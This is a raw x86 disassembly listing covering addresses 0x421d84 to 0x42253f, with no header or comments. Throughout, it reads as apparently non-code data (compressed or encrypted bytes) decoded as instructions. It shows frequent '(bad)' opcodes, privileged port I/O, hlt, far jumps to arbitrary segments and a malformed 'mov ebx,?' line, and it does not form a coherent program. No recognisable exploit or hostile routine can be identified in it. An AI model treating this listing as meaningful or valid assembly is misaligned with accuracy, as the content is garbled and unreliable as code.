  421d84:	cmp    BYTE PTR [ecx],dh
  421d86:	mov    cl,0x21
  421d88:	or     al,BYTE PTR [ecx+0x1f]
  421d8b:	jmp    0xa4a7cb38
  421d90:	and    BYTE PTR [ebx+0x35afca3],ah
  421d96:	push   edx
  421d97:	jle    0x421d9a
  421d99:	mov    dh,0xe
  421d9b:	sbb    edi,DWORD PTR [eax+ebx*8+0x1f]
  421d9f:	jecxz  0x421db2
  421da1:	sar    DWORD PTR [ebx+edx*1-0x44150752],cl
  421da8:	stos   DWORD PTR es:[edi],eax
  421da9:	push   ecx
  421daa:	sub    ax,0xc449
  421dae:	dec    esi
  421daf:	dec    edi
  421db0:	stos   BYTE PTR es:[edi],al
  421db1:	sar    BYTE PTR [ebp+edx*2+0x2e],0x5b
  421db6:	andps  xmm2,xmm3
  421db9:	movnti DWORD PTR ds:0x946e1d57,ebx
  421dc0:	jbe    0x421d63
  421dc2:	pop    es
  421dc3:	dec    ecx
  421dc4:	dec    ecx
  421dc5:	add    edi,DWORD PTR [ebx+0x5f]
  421dc8:	mov    ecx,edx
  421dca:	stos   DWORD PTR es:[edi],eax
  421dcb:	jp     0x421d4f
  421dcd:	cmp    eax,0x14a8bd93
  421dd2:	push   esp
  421dd3:	cmp    DWORD PTR [edi-0x55],edi
  421dd6:	mov    al,ds:0xc44ab195
  421ddb:	sub    DWORD PTR [ecx+0x43631717],ecx
  421de1:	mov    BYTE PTR [esi],bh
  421de3:	push   ebx
  421de4:	pop    esi
  421de5:	add    ebx,DWORD PTR [ebx*4+0x4ae35753]
  421dec:	(bad)  
  421ded:	mov    edi,0xbcf843fb
  421df2:	pusha  
  421df3:	jmp    0x421e07
  421df5:	fs pushf 
  421df7:	cdq    
  421df8:	ja     0x421d85
  421dfa:	pusha  
  421dfb:	mov    eax,ds:0x7d19d165
  421e00:	pop    edx
  421e01:	ret    
  421e02:	mov    esp,0x20e005d5
  421e07:	pusha  
  421e08:	or     edi,DWORD PTR [ebx-0x18]
  421e0b:	repz xchg edi,eax
  421e0d:	mov    bh,0xa8
  421e0f:	out    0x7b,al
  421e11:	ret    
  421e12:	mov    al,0x62
  421e14:	in     al,dx
  421e15:	adc    BYTE PTR [esi],al
  421e17:	rep ins DWORD PTR es:[edi],dx
  421e19:	add    esi,eax
  421e1b:	clc    
  421e1c:	aaa    
  421e1d:	rcr    BYTE PTR [ebx+0x6ddfc223],0x79
  421e24:	push   ecx
  421e25:	mov    cl,0xe2
  421e27:	cmp    eax,0xbb8888a8
  421e2c:	push   ss
  421e2d:	setg   BYTE PTR [eax-0x2b748416]
  421e34:	(bad)  
  421e35:	enter  0x1602,0x4c
  421e39:	std    
  421e3a:	sbb    DWORD PTR [edx+0x3e80b988],esp
  421e40:	jb     0x421e7d
  421e42:	dec    ecx
  421e43:	rol    DWORD PTR [ebx+0x3],0xe6
  421e47:	hlt    
  421e48:	push   ss
  421e49:	adc    DWORD PTR [ebp+0x72a0530d],ebp
  421e4f:	std    
  421e50:	push   ecx
  421e51:	xchg   ecx,eax
  421e52:	mov    bl,0xd4
  421e54:	xor    eax,0x38d12e10
  421e59:	cmc    
  421e5a:	fwait
  421e5b:	leave  
  421e5c:	add    ebx,DWORD PTR gs:[eax+0x3a30b392]
  421e63:	popf   
  421e64:	xchg   edx,eax
  421e65:	pop    esi
  421e66:	pop    eax
  421e67:	mov    eax,ds:0x8e9fe46e
  421e6c:	inc    ebx
  421e6d:	dec    ebx
  421e6e:	je     0x421ebd
  421e70:	out    0xa,al
  421e72:	add    dl,bh
  421e74:	dec    edx
  421e75:	xor    eax,0xa837ec27
  421e7a:	in     al,dx
  421e7b:	aas    
  421e7c:	push   eax
  421e7d:	pop    ecx
  421e7e:	push   ds
  421e7f:	add    eax,0xa412ce7f
  421e84:	outs   dx,BYTE PTR ds:[esi]
  421e85:	mov    dl,0x91
  421e87:	aad    0x6d
  421e89:	iret   
  421e8a:	scas   eax,DWORD PTR es:[edi]
  421e8b:	mov    WORD PTR [ecx-0x64],ds
  421e8e:	dec    edi
  421e8f:	xchg   edi,eax
  421e90:	std    
  421e91:	push   ecx
  421e92:	add    edx,esp
  421e94:	dec    edi
  421e95:	pop    ebx
  421e96:	test   DWORD PTR [edx],0x6cfd73a7
  421e9c:	mov    dh,BYTE PTR [eax-0x7a302dda]
  421ea2:	cli    
  421ea3:	arpl   ax,bp
  421ea5:	push   0xa589c19c
  421eaa:	fidiv  DWORD PTR [edi-0x6bf10d66]
  421eb0:	lods   al,BYTE PTR ds:[esi]
  421eb1:	add    eax,0xe443fdca
  421eb6:	mov    ebx,0x1f181c7e
  421ebb:	imul   esi,DWORD PTR gs:[eax+0x38],0xaba5687d
  421ec3:	test   eax,0x269ec030
  421ec8:	xchg   ebp,eax
  421ec9:	cli    
  421eca:	ins    DWORD PTR es:[edi],dx
  421ecb:	xlat   BYTE PTR ds:[ebx]
  421ecc:	xor    DWORD PTR [edi],edx
  421ece:	add    eax,0xa0a1e876
  421ed3:	jp     0x421ed7
  421ed5:	add    ecx,DWORD PTR [eax+0x4d]
  421ed8:	jb     0x421e5f
  421eda:	sub    al,dl
  421edc:	push   ss
  421edd:	cmp    al,0x1e
  421edf:	xchg   ecx,eax
  421ee0:	xor    edx,edx
  421ee2:	jecxz  0x421eed
  421ee4:	ror    BYTE PTR [ecx],1
  421ee6:	and    eax,0x220e8aae
  421eeb:	in     eax,dx
  421eec:	les    ebx,FWORD PTR [edx+esi*1-0x510e86e0]
  421ef3:	imul   ecx,DWORD PTR [ecx+0x607aa34d],0x8d9fd686
  421efd:	dec    ecx
  421efe:	clc    
  421eff:	xchg   ebp,eax
  421f00:	inc    edi
  421f01:	add    dh,cl
  421f03:	adc    eax,0x522c999f
  421f08:	jns    0x421f0a
  421f0a:	ins    DWORD PTR es:[edi],dx
  421f0b:	jge    0x421f49
  421f0d:	les    edx,FWORD PTR [ebx+0x51ada8cb]
  421f13:	xlat   BYTE PTR ds:[ebx]
  421f14:	pop    ebx
  421f15:	add    bh,BYTE PTR [esp+edi*8-0x86f3b94]
  421f1c:	outs   dx,BYTE PTR ds:[esi]
  421f1d:	and    ch,BYTE PTR [eax-0x67]
  421f20:	jmp    0x421eeb
  421f22:	ins    BYTE PTR es:[edi],dx
  421f23:	jmp    0xf429:0x26eeda86
  421f2a:	jecxz  0x421f8a
  421f2c:	leave  
  421f2d:	add    cl,al
  421f2f:	dec    edi
  421f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f31:	jmp    0x421ee7
  421f33:	jl     0x421ee8
  421f35:	push   ss
  421f36:	pop    ds
  421f37:	stc    
  421f38:	sbb    bh,al
  421f3a:	daa    
  421f3b:	mov    ecx,0xb8a8ae0c
  421f40:	hlt    
  421f41:	add    esp,0x7f2848b0
  421f47:	or     edi,ecx
  421f49:	cmp    edx,DWORD PTR [esi-0x29]
  421f4c:	push   esp
  421f4d:	in     al,dx
  421f4e:	loopne 0x421f5f
  421f50:	pop    ds
  421f51:	pop    esi
  421f52:	ds (bad) 
  421f54:	cli    
  421f55:	add    eax,0x1b42ab32
  421f5a:	and    eax,0x58c86f04
  421f5f:	int    0xc5
  421f61:	cdq    
  421f62:	pop    ds
  421f63:	jnp    0x421fbd
  421f65:	fwait
  421f66:	adc    al,0xac
  421f68:	and    eax,0x7a352202
  421f6d:	aam    0x9a
  421f6f:	outs   dx,BYTE PTR ds:[esi]
  421f70:	jmp    0xaaa33e96
  421f75:	ret    0x492b
  421f78:	pop    esp
  421f79:	loop   0x421fd9
  421f7b:	mov    ebx,0x565e3d9d
  421f80:	leave  
  421f81:	or     ecx,DWORD PTR [eax]
  421f83:	stos   BYTE PTR es:[edi],al
  421f84:	sbb    al,0x1b
  421f86:	pop    ds
  421f87:	jne    0x421fa3
  421f89:	xor    BYTE PTR [edi],bl
  421f8b:	mov    BYTE PTR [eax-0x11],0x5a
  421f8f:	aam    0xf3
  421f91:	sti    
  421f92:	jg     0x421ff8
  421f94:	mov    ss,WORD PTR [eax+ebx*2-0x65]
  421f98:	mov    ebp,eax
  421f9a:	inc    ebx
  421f9b:	mov    esi,0x318d31fc
  421fa0:	in     al,0x5
  421fa2:	jl     0x422013
  421fa4:	lods   eax,DWORD PTR ds:[esi]
  421fa5:	std    
  421fa6:	enter  0x6835,0xd7
  421faa:	cmp    ebx,DWORD PTR ds:0x6c1d918f
  421fb0:	dec    eax
  421fb1:	jge    0x42202b
  421fb3:	ss inc edi
  421fb5:	loope  0x421fc6
  421fb7:	inc    ebx
  421fb8:	aad    0x5
  421fba:	es lahf 
  421fbc:	leave  
  421fbd:	je     0x421fc7
  421fbf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fc1:	and    al,0x1f
  421fc3:	push   edi
  421fc4:	fwait
  421fc5:	xchg   ecx,eax
  421fc6:	pop    edi
  421fc7:	jnp    0x421f67
  421fc9:	retf   0xd416
  421fcc:	iret   
  421fcd:	or     esi,DWORD PTR [edx+eax*1]
  421fd0:	pop    esp
  421fd1:	sbb    eax,0xd388f0ad
  421fd6:	sub    DWORD PTR [ebp-0x7f4bb7c3],ecx
  421fdc:	jmp    0x41a691e3
  421fe1:	jmp    0x478f2bf8
  421fe6:	inc    edx
  421fe7:	dec    ecx
  421fe8:	or     eax,0x60
  421feb:	sbb    eax,0x4f2aa318
  421ff0:	stos   BYTE PTR es:[edi],al
  421ff1:	or     bh,al
  421ff3:	test   eax,0x572719da
  421ff8:	jecxz  0x422073
  421ffa:	push   ds
  421ffb:	xchg   ebx,eax
  421ffc:	int    0x44
  421ffe:	or     ch,ch
  422000:	dec    eax
  422001:	dec    esp
  422002:	cmp    dl,ah
  422004:	push   ss
  422005:	cli    
  422006:	gs inc esi
  422008:	cmp    ah,BYTE PTR [ebx-0x2]
  42200b:	outs   dx,BYTE PTR ds:[esi]
  42200c:	data16 js 0x42202d
  42200f:	xlat   BYTE PTR ds:[ebx]
  422010:	cmc    
  422011:	fldlg2 
  422013:	fsub   DWORD PTR [eax-0x4228f804]
  422019:	cmp    DWORD PTR [edx-0x4a],eax
  42201c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42201d:	sahf   
  42201e:	cdq    
  42201f:	pop    ebx
  422020:	dec    ecx
  422021:	xchg   ecx,eax
  422022:	pop    ds
  422023:	(bad)  
  422024:	mov    eax,0x964656a5
  422029:	pushf  
  42202a:	out    dx,eax
  42202b:	aam    0x40
  42202d:	pop    es
  42202e:	imul   esp,DWORD PTR [ebx],0xffffffc6
  422031:	inc    ecx
  422032:	fidivr WORD PTR [edx]
  422034:	xchg   edi,eax
  422035:	icebp  
  422036:	iret   
  422037:	and    BYTE PTR ds:0x7331be40,dh
  42203d:	mov    cl,0x1
  42203f:	and    DWORD PTR [eax-0x4f],esi
  422042:	dec    edx
  422043:	aad    0x29
  422045:	and    BYTE PTR [edi],al
  422047:	js     0x421fe9
  422049:	out    dx,eax
  42204a:	cmp    DWORD PTR [edx],esp
  42204c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42204d:	shl    DWORD PTR [edx],cl
  42204f:	push   esp
  422050:	mov    ebx,esp
  422052:	push   ebp
  422053:	in     al,0xda
  422055:	mov    BYTE PTR [esi],ch
  422057:	aam    0xc0
  422059:	adc    ecx,DWORD PTR [ebx+0x2]
  42205c:	hlt    
  42205d:	repnz in al,dx
  42205f:	mov    bl,0x8e
  422061:	(bad)  
  422062:	icebp  
  422063:	mov    ch,0x5a
  422065:	mov    bh,0x29
  422067:	out    dx,al
  422068:	or     edi,ebp
  42206a:	rcr    DWORD PTR [esi-0x5579063e],0x27
  422071:	out    dx,al
  422072:	lahf   
  422073:	cmp    dl,BYTE PTR [ecx-0x1e]
  422076:	mov    ds:0xe00c2fc7,al
  42207b:	cmp    ch,bl
  42207d:	mov    esp,ebx
  42207f:	jg     0x42203c
  422081:	int    0x41
  422083:	or     cl,BYTE PTR [eax+0x630be8e7]
  422089:	push   eax
  42208a:	lods   eax,DWORD PTR ds:[esi]
  42208b:	mov    eax,0x33c4dd88
  422090:	stc    
  422091:	call   0x320a393
  422096:	sub    cl,bh
  422098:	sbb    BYTE PTR [ecx+0xfd19de1],ah
  42209e:	pop    DWORD PTR [ebp+0x75]
  4220a1:	dec    eax
  4220a2:	xor    edx,ecx
  4220a4:	or     eax,ecx
  4220a6:	push   edx
  4220a7:	in     al,0xc4
  4220a9:	jbe    0x42211d
  4220ab:	aad    0x18
  4220ad:	repnz ss mov cl,0x2f
  4220b1:	or     DWORD PTR [ebx+esi*2],0xffffff88
  4220b5:	pop    edi
  4220b6:	inc    esp
  4220b7:	sbb    BYTE PTR [esi+0x1e],ah
  4220ba:	jl     0x422108
  4220bc:	test   DWORD PTR ds:0x9e80966a,0xb56762b3
  4220c6:	nop
  4220c7:	sub    BYTE PTR [ecx-0x61d76265],cl
  4220cd:	sti    
  4220ce:	daa    
  4220cf:	cwde   
  4220d0:	lds    eax,FWORD PTR [ebx]
  4220d2:	pop    esp
  4220d3:	xor    eax,0xc08d7fd4
  4220d8:	and    eax,0x89d2b1c2
  4220dd:	iret   
  4220de:	adc    BYTE PTR [ebp-0xd],bl
  4220e1:	mov    esi,0x25c5b37
  4220e6:	scas   al,BYTE PTR es:[edi]
  4220e7:	or     eax,0xe2f8f6b9
  4220ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ed:	mov    al,0x5b
  4220ef:	pop    ss
  4220f0:	push   ebx
  4220f1:	mov    bl,0x1f
  4220f3:	sub    DWORD PTR [esi+0x75],0xfffffff1
  4220f7:	xor    eax,0x505e3145
  4220fc:	and    al,0x23
  4220fe:	(bad)  
  4220ff:	sbb    al,0x48
  422101:	in     al,0x1f
  422103:	cmp    eax,DWORD PTR [ebx+0x3616d73c]
  422109:	sub    bl,BYTE PTR [esi-0x2b]
  42210c:	add    al,0xbe
  42210e:	outs   dx,DWORD PTR ds:[esi]
  42210f:	add    al,0x43
  422111:	jmp    0x4220c5
  422113:	ret    
  422114:	bound  ecx,QWORD PTR [edx+0x7a]
  422117:	gs push 0xffffffb0
  42211a:	cdq    
  42211b:	push   esp
  42211c:	add    ecx,DWORD PTR [ecx]
  42211e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42211f:	imul   esi,esi,0x2
  422122:	enter  0xa84c,0x68
  422126:	aam    0xc7
  422128:	jbe    0x422169
  42212a:	pop    edx
  42212b:	mov    DWORD PTR [eax+0xb],ebp
  42212e:	loope  0x4220e5
  422130:	ror    BYTE PTR [ebx-0x7a8f1152],1
  422136:	leave  
  422137:	xlat   BYTE PTR ds:[ebx]
  422138:	pop    edi
  422139:	clc    
  42213a:	into   
  42213b:	ss (bad) 
  42213d:	aad    0x55
  42213f:	clc    
  422140:	dec    eax
  422141:	push   ss
  422142:	inc    ebp
  422143:	dec    DWORD PTR [ecx-0x4fa6f75f]
  422149:	adc    ebp,DWORD PTR [eax+0x1202b0bd]
  42214f:	cmp    cl,BYTE PTR [ebp+0x3f60cc99]
  422155:	mov    ebp,0xe38bac50
  42215a:	pop    ecx
  42215b:	daa    
  42215c:	inc    esi
  42215d:	test   DWORD PTR [ebx-0xc],0x84d4dfc9
  422164:	data16 add BYTE PTR [esi-0x3],bh
  422168:	outs   dx,DWORD PTR ds:[esi]
  422169:	mov    al,ds:0x858c0a08
  42216e:	repz and al,0xdc
  422171:	and    BYTE PTR [ebp-0x34015632],0xdc
  422178:	mov    cl,dh
  42217a:	(bad)  
  42217b:	popf   
  42217c:	fiadd  WORD PTR [esi-0x75268fff]
  422182:	fldcw  WORD PTR [ecx-0x78]
  422185:	dec    eax
  422186:	aad    0xd
  422188:	ja     0x422127
  42218a:	jp     0x4221e0
  42218c:	xchg   esi,eax
  42218d:	lea    esp,[edi-0x37]
  422190:	int3   
  422191:	test   esp,ecx
  422193:	sbb    eax,0xd43d38ee
  422198:	xchg   esp,eax
  422199:	jge    0x42214c
  42219b:	xor    DWORD PTR [ecx-0x56],0x958ac5f3
  4221a2:	sub    edx,DWORD PTR [ebp-0x74]
  4221a5:	sub    BYTE PTR [edi+0x78cb697d],dl
  4221ab:	inc    esp
  4221ac:	mov    esi,ecx
  4221ae:	pusha  
  4221af:	out    0xfe,al
  4221b1:	call   0x131f:0xc15423e6
  4221b8:	arpl   WORD PTR [esi],di
  4221ba:	and    eax,0xa7e9267c
  4221bf:	aad    0x8a
  4221c1:	pop    es
  4221c2:	xchg   ecx,eax
  4221c3:	mov    al,ds:0xf12126fe
  4221c8:	xchg   esp,eax
  4221c9:	das    
  4221ca:	xor    BYTE PTR [ebx],bh
  4221cc:	nop
  4221cd:	xor    BYTE PTR [esi],0x97
  4221d0:	add    ah,BYTE PTR [edi]
  4221d2:	push   es
  4221d3:	aam    0x55
  4221d5:	sbb    eax,0xd61c8a7d
  4221da:	fst    DWORD PTR [edx+0x7553c787]
  4221e0:	fsubp  st(4),st
  4221e2:	dec    ebp
  4221e3:	sbb    al,0x89
  4221e5:	sub    BYTE PTR [esi],dh
  4221e7:	sti    
  4221e8:	add    edx,DWORD PTR ss:[edx]
  4221eb:	xchg   ch,dh
  4221ed:	pop    eax
  4221ee:	sub    ch,ch
  4221f0:	fist   DWORD PTR [edi]
  4221f2:	push   ds
  4221f3:	imul   ebp,DWORD PTR [ecx-0x3e],0x39aea535
  4221fa:	xchg   edi,eax
  4221fb:	aam    0x72
  4221fd:	cdq    
  4221fe:	or     BYTE PTR [esi],al
  422200:	les    edi,FWORD PTR [edx+0x68]
  422203:	or     dh,BYTE PTR [esi+0x8663d75]
  422209:	sbb    ecx,DWORD PTR ds:0xc6e738d1
  42220f:	mov    eax,ds:0x2fcbf796
  422214:	in     eax,dx
  422215:	add    ah,BYTE PTR [esi+0x4670f417]
  42221b:	imul   ecx,DWORD PTR [eax-0x6f750e01],0x23aec363
  422225:	xchg   ebx,eax
  422226:	retf   
  422227:	(bad)  
  422228:	jle    0x422250
  42222a:	test   bl,0x45
  42222d:	jle    0x42228d
  42222f:	dec    esi
  422230:	psrad  mm4,QWORD PTR [edi]
  422233:	ret    
  422234:	mov    edi,DWORD PTR [ecx+0x6a1edb1a]
  42223a:	pusha  
  42223b:	jecxz  0x4222b5
  42223d:	neg    DWORD PTR [edx-0x53]
  422240:	sub    dh,BYTE PTR [edx+0x150310b2]
  422246:	adc    eax,0xb3db9e77
  42224b:	cmp    eax,0x1644c988
  422250:	(bad)  
  422251:	and    eax,0x33140ce
  422256:	mov    edx,0xd94a7756
  42225b:	clc    
  42225c:	lahf   
  42225d:	push   0xe56fbf6c
  422262:	push   ecx
  422263:	out    dx,al
  422264:	sub    DWORD PTR [ebp+0x4b],ebp
  422267:	and    esi,esp
  422269:	add    eax,0xba4fd19a
  42226e:	jae    0x422257
  422270:	lods   al,BYTE PTR ds:[esi]
  422271:	sbb    DWORD PTR [edx-0x19],edi
  422274:	adc    DWORD PTR ds:0x6695414,edi
  42227a:	mov    dl,0xd5
  42227c:	add    eax,0xfdb17c1d
  422281:	xchg   BYTE PTR [edx-0x614696bf],cl
  422287:	dec    ecx
  422288:	mov    DWORD PTR [ebx-0x7c],esp
  42228b:	adc    ch,BYTE PTR ds:0x5b4acb70
  422291:	adc    eax,0x45f23bd6
  422296:	mov    esp,0xa9436
  42229b:	sbb    al,0xae
  42229d:	icebp  
  42229e:	pusha  
  42229f:	popf   
  4222a0:	or     al,BYTE PTR [eax+ebp*8]
  4222a3:	push   cs
  4222a4:	xor    BYTE PTR [ebp-0x53202a7d],bh
  4222aa:	(bad)  
  4222ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222ac:	(bad)  
  4222ad:	clc    
  4222ae:	mov    bl,0xd9
  4222b0:	mov    BYTE PTR [ebx],ah
  4222b2:	cdq    
  4222b3:	dec    ebp
  4222b4:	fs xchg al,bh
  4222b7:	and    bl,0x5
  4222ba:	or     al,BYTE PTR [edi-0x21]
  4222bd:	icebp  
  4222be:	lds    edi,FWORD PTR [ebp+0x751fb84c]
  4222c4:	lods   eax,DWORD PTR ds:[esi]
  4222c5:	push   esp
  4222c6:	xchg   edi,eax
  4222c7:	xchg   edx,eax
  4222c8:	mov    ebx,?
  4222ca:	call   esi
  4222cc:	mov    esp,0xaf12c993
  4222d1:	pop    ds
  4222d2:	add    eax,0x1e2cc1f7
  4222d7:	test   DWORD PTR ds:0x4a74e7de,esi
  4222dd:	mov    eax,ds:0x6f2cd449
  4222e2:	add    BYTE PTR [ebx-0x4],al
  4222e5:	xor    esi,DWORD PTR [eax+0x7c]
  4222e8:	mov    DWORD PTR [edi-0x23066686],eax
  4222ee:	test   eax,0xf0035cc7
  4222f3:	test   BYTE PTR [ebx+0x18],al
  4222f6:	pushw  cs
  4222f8:	mov    esi,0xb7437a7f
  4222fd:	xor    edx,edi
  4222ff:	aam    0xd8
  422301:	in     eax,0x1f
  422303:	loop   0x42236c
  422305:	adc    eax,0x8ef4086c
  42230a:	push   esp
  42230b:	adc    al,0x75
  42230d:	das    
  42230e:	inc    esp
  42230f:	call   0x9509:0x787c8bb7
  422316:	jne    0x4222fb
  422318:	int3   
  422319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42231a:	pop    es
  42231b:	xlat   BYTE PTR ds:[ebx]
  42231c:	add    BYTE PTR [edi+0x5c126723],bh
  422322:	pop    esp
  422323:	test   DWORD PTR [ecx-0x4c31fe49],esi
  422329:	xor    DWORD PTR [edi],ebx
  42232b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42232c:	jg     0x4222b9
  42232e:	cld    
  42232f:	sbb    bh,BYTE PTR [edx]
  422331:	add    bl,dl
  422333:	shl    dl,1
  422335:	add    ch,BYTE PTR [ebx+0x60c46857]
  42233b:	retf   
  42233c:	cmp    ebp,DWORD PTR [ebx]
  42233e:	add    DWORD PTR [eax-0x14],ebx
  422341:	xchg   edi,eax
  422342:	push   0xffffffd5
  422344:	adc    al,0xf7
  422346:	sub    DWORD PTR [esi],esi
  422348:	lea    eax,[edx+0x74]
  42234b:	lea    ecx,[ecx-0x244c759]
  422351:	(bad)  
  422352:	xchg   edx,eax
  422353:	stos   BYTE PTR es:[edi],al
  422354:	data16 add bl,BYTE PTR [edx]
  422357:	push   ss
  422358:	xchg   ecx,eax
  422359:	lods   al,BYTE PTR ds:[esi]
  42235a:	dec    ebp
  42235b:	(bad)  
  42235c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42235d:	(bad)  
  42235e:	pop    ds
  42235f:	cmp    DWORD PTR [ebp-0x6e],ebx
  422362:	fsub   DWORD PTR [edx+edx*2]
  422365:	je     0x4223a1
  422367:	xlat   BYTE PTR ds:[ebx]
  422368:	ret    
  422369:	sti    
  42236a:	add    DWORD PTR [esi-0x78846771],ecx
  422370:	xchg   ebp,eax
  422371:	inc    edi
  422372:	xor    BYTE PTR [ebp-0x4518591d],dl
  422378:	inc    esi
  422379:	and    BYTE PTR [ebx-0x77],0xc0
  42237d:	mov    ebp,0x1ccd42f
  422382:	(bad)
  422386:	call   0x5a33acf5
  42238b:	outs   dx,DWORD PTR ds:[esi]
  42238c:	inc    esi
  42238d:	cmp    eax,esi
  42238f:	dec    ecx
  422390:	dec    edi
  422391:	add    edx,DWORD PTR [eax+0x43]
  422394:	cld    
  422395:	jge    0x42238a
  422397:	dec    ebx
  422398:	test   eax,0xc30b5850
  42239d:	cs std 
  42239f:	test   eax,0x25b9020c
  4223a4:	inc    esi
  4223a5:	jbe    0x42239d
  4223a7:	rcl    DWORD PTR [edx],cl
  4223a9:	fidivr WORD PTR [edx+0x1dedb61e]
  4223af:	mov    bh,0xca
  4223b1:	(bad)  
  4223b2:	imul   esp,DWORD PTR [eax+0x55],0x2f
  4223b6:	push   ds
  4223b7:	jae    0x42233b
  4223b9:	stc    
  4223ba:	inc    DWORD PTR [edi+0x4]
  4223bd:	fwait
  4223be:	rcl    ch,cl
  4223c0:	fldenv [ebp+0x75]
  4223c3:	jnp    0x422384
  4223c5:	cwde   
  4223c6:	cmovne esp,DWORD PTR [ecx+ecx*2-0x7c76d50e]
  4223ce:	(bad)  
  4223cf:	daa    
  4223d0:	mov    ecx,0x233da933
  4223d5:	es jp  0x422421
  4223d8:	pop    ebx
  4223d9:	enter  0xb11f,0x8a
  4223dd:	or     eax,0x6588d15f
  4223e2:	rcl    DWORD PTR [edx],cl
  4223e4:	stos   DWORD PTR es:[edi],eax
  4223e5:	ret    0x1b4a
  4223e8:	sub    eax,DWORD PTR [edx]
  4223ea:	xchg   BYTE PTR [ecx],dl
  4223ec:	push   cs
  4223ed:	sbb    al,0xb7
  4223ef:	out    0x63,al
  4223f1:	jecxz  0x422455
  4223f3:	and    ebx,esp
  4223f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223f6:	sub    edi,ebp
  4223f8:	xchg   ebx,eax
  4223f9:	inc    esi
  4223fa:	pop    es
  4223fb:	sti    
  4223fc:	xchg   ecx,eax
  4223fd:	add    dl,BYTE PTR [edi+eiz*4-0x7414b439]
  422404:	es aam 0x65
  422407:	inc    ecx
  422408:	and    BYTE PTR [eax+0x1c64f5ed],0x79
  42240f:	cmc    
  422410:	fdivr  QWORD PTR [ebx-0x51]
  422413:	aam    0xc1
  422415:	xchg   DWORD PTR [edx],esi
  422417:	mov    ch,BYTE PTR [edx-0x25]
  42241a:	inc    ebx
  42241b:	or     cl,BYTE PTR [eax+0x38f9e613]
  422421:	rcl    DWORD PTR [edx-0x620063c1],0xd5
  422428:	push   cs
  422429:	sbb    dl,BYTE PTR [esi]
  42242b:	std    
  42242c:	in     al,0x23
  42242e:	adc    ebp,DWORD PTR [eax-0x78]
  422431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422432:	out    dx,al
  422433:	jmp    0x591:0xf71ec9b1
  42243a:	inc    eax
  42243b:	pop    edi
  42243c:	dec    eax
  42243d:	mov    ebx,0xb3f9f8c5
  422442:	pop    ds
  422443:	adc    eax,0x5ce6d3cf
  422448:	jne    0x42244a
  42244a:	mov    edi,0xb60267c5
  42244f:	test   DWORD PTR [edx+0x52],esi
  422452:	mov    BYTE PTR [ebp+0x22],0x60
  422456:	push   ds
  422457:	iret   
  422458:	cmp    ebp,DWORD PTR [ebx+0x8bc866e]
  42245e:	xlat   BYTE PTR ds:[ebx]
  422460:	mov    cl,0x7
  422462:	or     BYTE PTR [eax-0x5a],0x86
  422466:	pop    ds
  422467:	xchg   BYTE PTR [eax+0x4607289f],cl
  42246d:	xor    eax,0x325d0348
  422472:	out    dx,al
  422473:	imul   eax,DWORD PTR [ebx-0x467f4e46],0x19
  42247a:	mov    bl,0xc1
  42247c:	mov    BYTE PTR [edx+0x4d41d5fb],dh
  422482:	mov    bl,0x34
  422484:	or     ch,BYTE PTR [esi]
  422486:	dec    ebx
  422487:	ror    BYTE PTR [ecx-0x6e118957],1
  42248d:	and    ch,BYTE PTR [esi]
  42248f:	xor    esp,edx
  422491:	inc    esi
  422492:	inc    esp
  422493:	fdiv   DWORD PTR [ecx-0xeb16ffb]
  422499:	in     al,dx
  42249a:	xor    eax,0xbeed87b7
  42249f:	cmp    edx,ecx
  4224a1:	or     bh,BYTE PTR [edi+0x1db1d5ab]
  4224a7:	fmul   DWORD PTR [esp+edx*1]
  4224aa:	push   0xb8e4fcd9
  4224af:	(bad)  
  4224b0:	shr    dl,cl
  4224b2:	xor    ebp,DWORD PTR [edi]
  4224b4:	rcr    DWORD PTR ss:[edi],cl
  4224b7:	leave  
  4224b8:	mov    DWORD PTR [eax+0x7b],edx
  4224bb:	sub    DWORD PTR [esp+0x2d35d4c1],esi
  4224c2:	in     eax,0x55
  4224c4:	hlt    
  4224c5:	out    0xb3,eax
  4224c7:	jp     0x422452
  4224c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224ca:	pop    eax
  4224cb:	xchg   ecx,eax
  4224cc:	fsubr  QWORD PTR ds:0x2bc5551
  4224d2:	les    edi,FWORD PTR [ecx]
  4224d4:	iret   
  4224d5:	jo     0x422469
  4224d7:	pushf  
  4224d8:	mov    ds:0xce111e56,eax
  4224dd:	and    edi,DWORD PTR [ebp-0xb]
  4224e0:	ins    BYTE PTR es:[edi],dx
  4224e1:	xchg   esi,eax
  4224e2:	add    ah,dl
  4224e4:	addr16 sbb al,0xf5
  4224e7:	push   ebp
  4224e8:	dec    edi
  4224e9:	je     0x422532
  4224eb:	jmp    0xa2c3:0xabbf3e66
  4224f2:	mov    bh,0xee
  4224f4:	hlt    
  4224f5:	add    bl,BYTE PTR [ebx+edi*1-0x75]
  4224f9:	and    eax,0x72d24cad
  4224fe:	pop    ds
  4224ff:	out    dx,eax
  422500:	dec    edx
  422501:	fistp  WORD PTR [esp+ebx*4+0x32]
  422505:	dec    esi
  422506:	in     eax,dx
  422507:	int3   
  422508:	or     BYTE PTR [ebx],al
  42250a:	into   
  42250b:	fsubr  st,st(2)
  42250d:	sub    al,0x3e
  42250f:	push   ebx
  422510:	ins    BYTE PTR es:[edi],dx
  422511:	retf   
  422512:	popa   
  422513:	sti    
  422514:	into   
  422515:	dec    ebx
  422516:	lods   al,BYTE PTR ds:[esi]
  422517:	jne    0x422569
  422519:	adc    ebx,DWORD PTR [esi+0x53f28c4f]
  42251f:	mov    ds:0x7c85e84c,eax
  422524:	mov    BYTE PTR [edx],dh
  422526:	cmp    ebx,0x1d48d899
  42252c:	test   al,0xd
  42252e:	ds mov bl,0x34
  422531:	cwde   
  422532:	dec    bp
  422534:	mov    edx,0xe06440b0
  422539:	push   ds
  42253a:	out    dx,eax
  42253b:	aad    0x3c
  42253d:	dec    edx
  42253e:	push   esi
  42253f:	or     bl,BYTE PTR [ecx+esi*1+0x5a]
